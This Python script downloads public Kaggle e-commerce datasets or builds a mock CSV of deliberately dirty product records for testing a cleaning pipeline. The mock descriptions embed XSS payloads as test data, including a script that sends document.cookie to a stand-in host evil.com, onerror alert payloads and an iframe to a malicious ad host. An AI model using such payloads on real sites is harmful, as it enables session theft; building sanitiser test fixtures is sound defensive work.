#!/usr/bin/env python3
import argparse
import os
import shutil
import kagglehub

# Define dataset mappings
KAGGLE_DATASETS = {
    "amazon-2020": "promptcloud/amazon-product-dataset-2020",
    "amazon-uk-2023": "ahmedshabanelshazly/amazon-uk-products-dataset-2023",
    "dirty-ecommerce": "kashishrastogi/dirty-e-commerce-data"
}

RAW_DIR = "data/raw"

def generate_local_demo():
    print("Generating local demo dataset with dirty e-commerce mock records...")
    os.makedirs(RAW_DIR, exist_ok=True)
    demo_file = os.path.join(RAW_DIR, "demo_products.csv")
    
    csv_content = [
        "sku,name,price,description,image_url,category,brand",
        'B07XYZ123,"Kids Robot Toy 🤖",29.99,"<div class=\'legacy-cms\' onclick=\\"track()\\">Your kids will <b>love</b> this! <script>fetch(\'https://evil.com/steal?c=\'+document.cookie)</script> <img src=x onerror=alert(1)> Response time < 2ms. Ages < 12.</div>","https://example.com/toy.jpg",Toys,RoboCorp',
        # Escaped double quotes according to RFC 4180 (using "" instead of \")
        'B07ABC456,"Gaming Monitor 27""","","Response time is < 1ms for ultimate performance. Great for games < 18+.","https://example.com/monitor.jpg",Electronics,ViewTech',
        'B07XYZ123,"Duplicate SKU Entry",19.99,"Duplicate SKU check to verify deduplication algorithm.","https://example.com/toy.jpg",Toys,RoboCorp',
        'B07DEF789,"Healthy Organic Oats",4.50,"Simple healthy oats description without any HTML formatting.","",Groceries,EcoFoods',
        'B07GHI101,"Premium Wireless Headphones",149.99,"Listen in high fidelity. <iframe src=\'https://malicious-ad-network.com\'></iframe>","https://example.com/headphones.jpg",Electronics,AudioZen',
        'B07JKL111,"Mini Coffee Maker",45.00,"ALL CAPS DULL DESCRIPTION THAT HURTS RANKINGS",,"Home & Kitchen",BrewMaster',
    ]
    
    # Generate 10,000 mock products to fulfill testing performance requirement
    for i in range(10000):
        if i % 100 == 0:
            desc = f"Mock description {i} with <script>alert(1)</script> XSS payload."
            price = "" # Empty price (invalid)
        elif i % 50 == 0:
            desc = f"Mock description {i} with legitimate <b>bold text</b> and < 10 characters."
            price = "9.99"
        else:
            desc = f"Clean mock description for item {i}."
            price = f"{(i % 200) + 1.99:.2f}"
            
        csv_content.append(
            f"MOCK-SKU-{i},\"Mock Product {i}\",{price},\"{desc}\",\"https://example.com/image_{i}.jpg\",Category-{i % 5},Brand-{i % 10}"
        )
        
    with open(demo_file, "w", encoding="utf-8") as f:
        f.write("\n".join(csv_content))
        
    print(f"Demo file successfully written to {demo_file} (10,000+ entries).")

def main():
    parser = argparse.ArgumentParser(description="Download public Kaggle e-commerce datasets and prepare them.")
    parser.add_argument(
        "--dataset", 
        type=str, 
        choices=["amazon-2020", "amazon-uk-2023", "dirty-ecommerce", "local-demo"], 
        default="local-demo",
        help="Specify which dataset to download or generate."
    )
    parser.add_argument(
        "--sample",
        type=int,
        default=None,
        help="Limit output to N rows during the preparation stage."
    )
    args = parser.parse_args()

    if args.dataset == "local-demo":
        generate_local_demo()
    else:
        kaggle_path = KAGGLE_DATASETS[args.dataset]
        print(f"Downloading dataset '{args.dataset}' ({kaggle_path}) using kagglehub...")
        
        try:
            downloaded_path = kagglehub.dataset_download(kaggle_path)
            print(f"Dataset downloaded to cache at: {downloaded_path}")
            
            dest_dir = os.path.join(RAW_DIR, args.dataset)
            os.makedirs(dest_dir, exist_ok=True)
            
            if os.path.isdir(downloaded_path):
                for file_name in os.listdir(downloaded_path):
                    src_item = os.path.join(downloaded_path, file_name)
                    dest_item = os.path.join(dest_dir, file_name)
                    if os.path.isdir(src_item):
                        shutil.copytree(src_item, dest_item, dirs_exist_ok=True)
                    else:
                        shutil.copy(src_item, dest_item)
            else:
                shutil.copy(downloaded_path, dest_dir)
                
            print(f"Dataset successfully copied to local raw storage: {dest_dir}")
            
        except Exception as e:
            print(f"\nError downloading from Kaggle: {str(e)}")
            print("Falling back to generating local mock dataset to ensure testability...")
            generate_local_demo()
            args.dataset = "local-demo"

    try:
        from prepare_datasets import process_dataset
        process_dataset(args.dataset, args.sample)
    except Exception as e:
        print(f"Failed to automatically prepare dataset: {str(e)}")

if __name__ == "__main__":
    main()
